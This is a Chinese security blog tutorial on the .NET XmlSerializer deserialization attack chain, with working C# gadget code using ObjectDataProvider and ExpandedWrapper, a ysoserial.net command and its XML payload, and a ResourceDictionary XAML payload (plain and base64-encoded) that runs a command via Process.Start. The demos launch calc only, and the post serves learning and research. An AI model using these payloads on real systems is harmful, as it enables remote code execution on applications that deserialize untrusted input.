<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Dotnet基础链-XmlSerializer链 | ConsT27's Blog</title><meta name="keywords" content="Dotnet开发与安全"><meta name="author" content="ConsT27"><meta name="copyright" content="ConsT27"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基础链-XmlSerializer链XmlSerializer序列化&#x2F;反序列化来个demo 我们把要序列化的类用[XmlRoot]，[XmlAttribute]，[XmlElement]特性分别指定根节点，节点属性，节点元素。然后用XmlSerializer 进行序列化和反序列化 using System;using System.Runtime.Serialization;using Syste">
<meta property="og:type" content="article">
<meta property="og:title" content="Dotnet基础链-XmlSerializer链">
<meta property="og:url" content="http://const27.com/2022/03/27/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/index.html">
<meta property="og:site_name" content="ConsT27&#39;s Blog">
<meta property="og:description" content="基础链-XmlSerializer链XmlSerializer序列化&#x2F;反序列化来个demo 我们把要序列化的类用[XmlRoot]，[XmlAttribute]，[XmlElement]特性分别指定根节点，节点属性，节点元素。然后用XmlSerializer 进行序列化和反序列化 using System;using System.Runtime.Serialization;using Syste">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bw.png">
<meta property="article:published_time" content="2022-03-27T10:44:45.582Z">
<meta property="article:modified_time" content="2022-03-27T10:48:25.790Z">
<meta property="article:author" content="ConsT27">
<meta property="article:tag" content="Dotnet开发与安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bw.png"><link rel="shortcut icon" href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219183209.png"><link rel="canonical" href="http://const27.com/2022/03/27/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-27 18:48:25'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="ConsT27's Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw Link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw About"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://const27blog.oss-cn-beijing.aliyuncs.com/img/bw.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ConsT27's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw Link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw About"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Dotnet基础链-XmlSerializer链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-27T10:44:45.582Z" title="发表于 2022-03-27 18:44:45">2022-03-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-27T10:48:25.790Z" title="更新于 2022-03-27 18:48:25">2022-03-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="基础链-XmlSerializer链"><a href="#基础链-XmlSerializer链" class="headerlink" title="基础链-XmlSerializer链"></a>基础链-XmlSerializer链</h1><h1 id="XmlSerializer序列化-反序列化"><a href="#XmlSerializer序列化-反序列化" class="headerlink" title="XmlSerializer序列化/反序列化"></a>XmlSerializer序列化/反序列化</h1><p>来个demo</p>
<p>我们把要序列化的类用[XmlRoot]，[XmlAttribute]，[XmlElement]特性分别指定根节点，节点属性，节点元素。<br>然后用XmlSerializer 进行序列化和反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line">using System.Security.Permissions;</span><br><span class="line">using System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line">namespace ConsoleAppi1;</span><br><span class="line">[XmlRoot]</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    [XmlAttribute]</span><br><span class="line">    <span class="keyword">public</span> string name &#123; get; set; &#125;</span><br><span class="line">    </span><br><span class="line">    [XmlElement]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age &#123; get; set; &#125;</span><br><span class="line">    </span><br><span class="line">    [XmlElement]</span><br><span class="line">    <span class="keyword">public</span> string sex &#123; get; set; &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person();</span><br><span class="line">        p1.age = <span class="number">20</span>;</span><br><span class="line">        p1.name = <span class="string">&quot;tom&quot;</span>;</span><br><span class="line">        p1.sex = <span class="string">&quot;male&quot;</span>;</span><br><span class="line"></span><br><span class="line">        FileStream fstream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//XmlSerializer xmlSerializer = new XmlSerializer(typeof(Person));</span></span><br><span class="line">        <span class="comment">//XmlSerializer xmlSerializer = new XmlSerializer(p1.GetType());</span></span><br><span class="line">        XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(Type.GetType(<span class="string">&quot;ConsoleAppi1.Person&quot;</span>));</span><br><span class="line"></span><br><span class="line">        xmlSerializer.Serialize(fstream,p1);</span><br><span class="line"></span><br><span class="line">        fstream.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Person p1des =(Person) xmlSerializer.Deserialize(fstream);</span><br><span class="line">        Console.WriteLine(p1des.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化后成功输出</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183016.png"></p>
<p>这是序列化后的内容</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183017.png"></p>
<p>同时我们在上面的代码中可以看到在实例化XmlSerializer 时，在传入的参数中我们用到了Type.GetType方法去获取需要被序列化/反序列化的类的type。<br>除了用Type.GetType外，在注释的几行里我们还可以发现，可以用 typeof(ClassName) 和 Object.GetType() 去获取。</p>
<h1 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h1><h3 id="ObjectDataProvider"><a href="#ObjectDataProvider" class="headerlink" title="ObjectDataProvider"></a>ObjectDataProvider</h3><p>要打造围绕XmlSerializer 的攻击链，我们需要先了解一下ObjectDataProvider这个类，这个类可以帮助我们进行命令执行等操作。</p>
<p>这个类位于System.Windows.Data下（如果rider提示找不到包，就添加PresentationFramework依赖，注意我当前的环境是.NET FrameWork）。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183021.png"></p>
<p>前置知识：在.net中我们可以通过方法System.Diagnostics.Process.start()来执行命令，就像java里的 Runtime.getRuntime.exec() 一样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectDataProvider o = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">o.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">o.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">o.ObjectInstance = <span class="keyword">new</span> System.Diagnostics.Process();</span><br></pre></td></tr></table></figure>

<p>这段代码执行后后在内部调用System.Diagnostics.Process.start弹计算器出来。<br>ObjectInstance用于指定对象，MethodName用于指定要被调用的方法，MethodParameters指定被调用方法的参数，参数用Add添加。</p>
<p>同时这段代码在通过xmlserializer反序列化时依旧能够起到命令执行的作用，但是直接反序列化会遇到一些问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Windows.Data;</span><br><span class="line">using System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1</span><br><span class="line">&#123;</span><br><span class="line">    [XmlRoot]</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evilfunc</span><span class="params">(string c)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            System.Diagnostics.Process.Start(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            ObjectDataProvider op = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            op.ObjectInstance = <span class="keyword">new</span> evil();</span><br><span class="line">            op.MethodName = <span class="string">&quot;evilfunc&quot;</span>;</span><br><span class="line">            op.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            FileStream fileStream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate,</span><br><span class="line">                FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line">            XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(typeof(ObjectDataProvider));</span><br><span class="line">            xmlSerializer.Serialize(fileStream,op);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接反序列化会报下面的错。因为我们往XmlSerializer 传入的type是ObjectDataProvider，但是实际上我们的ObjectDataProvider中有含有evil类，就会导致类型错误。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183020.png"></p>
<p>解决方案是用ExpandedWrapper进行包装（如果找不到这个类，rider里右键Dependencies→add References→ System.Data.Services)</p>
<p>就像这样</p>
<p>ExpandedWrapper本质上是一个泛型类，可以封装非特定数据类型的对象。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183018.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Windows.Data;</span><br><span class="line">using System.Xml.Serialization;</span><br><span class="line">using System.Data.Services.Internal;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1</span><br><span class="line">&#123;</span><br><span class="line">    [XmlRoot]</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evilfunc</span><span class="params">(string c)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            System.Diagnostics.Process.Start(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            ExpandedWrapper&lt;evil, ObjectDataProvider&gt; ew = <span class="keyword">new</span> ExpandedWrapper&lt;evil, ObjectDataProvider&gt;();</span><br><span class="line">            ew.ProjectedProperty0 = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            ew.ProjectedProperty0.ObjectInstance = <span class="keyword">new</span> evil();</span><br><span class="line">            ew.ProjectedProperty0.MethodName = <span class="string">&quot;evilfunc&quot;</span>;</span><br><span class="line">            ew.ProjectedProperty0.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">            FileStream fileStream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate,</span><br><span class="line">                FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line">            XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(typeof(ExpandedWrapper&lt;evil, ObjectDataProvider&gt;));</span><br><span class="line">            xmlSerializer.Serialize(fileStream,ew);</span><br><span class="line">            fileStream.Position = <span class="number">0</span>;</span><br><span class="line">            xmlSerializer.Deserialize(fileStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化后成功弹出计算器。</p>
<h2 id="ResourceDictionary"><a href="#ResourceDictionary" class="headerlink" title="ResourceDictionary"></a>ResourceDictionary</h2><p>我们在上一小节讲了ObjectDataProvider并写了一个小demo，但是仅仅是那样的话，威胁还不够大，我们需要找到一个现存的恶意类，并且还要控制反序列化的内容，以及实例化XmlSerializer时传入的参数才有可能完成攻击。</p>
<p>我们可以用ysoserial.net来生成一段XmlSerializer反序列化的payload<br><a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.34">https://github.com/pwntester/ysoserial.net/releases/tag/v1.34</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">.\ysoserial.exe -g objectdataprovider -c calc -f xmlserializer</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;root type=<span class="string">&quot;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>&gt;</span><br><span class="line">    &lt;ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> &gt;</span><br><span class="line">        &lt;ExpandedElement/&gt;</span><br><span class="line">        &lt;ProjectedProperty0&gt;</span><br><span class="line">            &lt;MethodName&gt;Parse&lt;/MethodName&gt;</span><br><span class="line">            &lt;MethodParameters&gt;</span><br><span class="line">                &lt;anyType xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> xsi:type=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><br><span class="line">                    &lt;![CDATA[&lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:d=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:b=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:c=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;&lt;ObjectDataProvider d:Key=&quot;&quot; ObjectType=&quot;&#123;d:Type c:Process&#125;&quot; MethodName=&quot;Start&quot;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;</span><br><span class="line">                &lt;/anyType&gt;</span><br><span class="line">            &lt;/MethodParameters&gt;</span><br><span class="line">            &lt;ObjectInstance xsi:type=&quot;XamlReader&quot;&gt;&lt;/ObjectInstance&gt;</span><br><span class="line">        &lt;/ProjectedProperty0&gt;</span><br><span class="line">    &lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>但是它生成的payload对于新手分析起来难免有点恼火，所以我参考了Y4er提供的payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;ResourceDictionary </span><br><span class="line">                    xmlns=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span> </span><br><span class="line">                    xmlns:d=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;</span> </span><br><span class="line">                    xmlns:b=<span class="string">&quot;clr-namespace:System;assembly=mscorlib&quot;</span> </span><br><span class="line">                    xmlns:c=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=system&quot;</span>&gt;</span><br><span class="line">    &lt;ObjectDataProvider d:Key=<span class="string">&quot;&quot;</span> ObjectType=<span class="string">&quot;&#123;d:Type c:Process&#125;&quot;</span> MethodName=<span class="string">&quot;Start&quot;</span>&gt;</span><br><span class="line">        &lt;ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">            &lt;b:String&gt;cmd&lt;/b:String&gt;</span><br><span class="line">            &lt;b:String&gt;/c calc&lt;/b:String&gt;</span><br><span class="line">        &lt;/ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">    &lt;/ObjectDataProvider&gt;</span><br><span class="line">&lt;/ResourceDictionary&gt;</span><br></pre></td></tr></table></figure>

<p>这段payload实际上是xaml（可以理解为和xml相近的语言），解读如下：</p>
<ol>
<li>xmlns:c 引用了System.Diagnostics命名空间起别名为c</li>
<li>d:Key=”” 起别名为空，在xaml语法中，Key这个键值必须有。</li>
<li>ObjectType表示对象类型</li>
<li>d:Type 等同于typeof()，那么 d:Type c:Process 就相当于 typeof(System.Diagnostics.Process)</li>
<li>MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。</li>
</ol>
<p>如果这段xaml被解析，那么就相当于创建了一个ObjectDataProvider 对象去执行System.Diagnostics.Process.start(“calc”)</p>
<p>那么如何被解析呢？</p>
<p>网上大致有两种思路</p>
<p>1.实例化XmlSerializer时传入的type可控，且XmlSerializer.Deserialize的参数可控，但是由于Deserialize方法并不能接收string参数，所以说这个思路可能更加适合通过代码审计发现一些新的链（这样的话就没必要用到ResourceDictionary了）</p>
<p>2.使用XamlReader.Parse ，这个方法可以直接传入string参数</p>
<p>下面用XamlReader.Parse解析一下上面的xaml</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">string p = <span class="string">&quot;PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==&quot;</span>;</span><br><span class="line"><span class="keyword">byte</span>[] vs = Convert.FromBase64String(p);</span><br><span class="line">string xml = Encoding.UTF8.GetString(vs);</span><br><span class="line">XamlReader.Parse(xml);</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183019.png"></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183022.png"></p>
<h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref:"></a>Ref:</h1><p><a target="_blank" rel="noopener" href="https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/172316#h3-8">https://www.anquanke.com/post/id/172316#h3-8</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_13953961/3106574">https://blog.51cto.com/u_13953961/3106574</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ConsT27</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://const27.com/2022/03/27/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/">http://const27.com/2022/03/27/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://const27.com" target="_blank">ConsT27's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Dotnet%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/">Dotnet开发与安全</a></div><div class="post_share"><div class="social-share" data-image="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bw.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" target="_blank"><img class="post-qr-code-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/03/27/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/"><img class="next-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bo.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Dotnet反序列化入门各概念</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/27/Dotnet反序列化入门各概念/" title="Dotnet反序列化入门各概念"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bo.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-27</div><div class="title">Dotnet反序列化入门各概念</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas 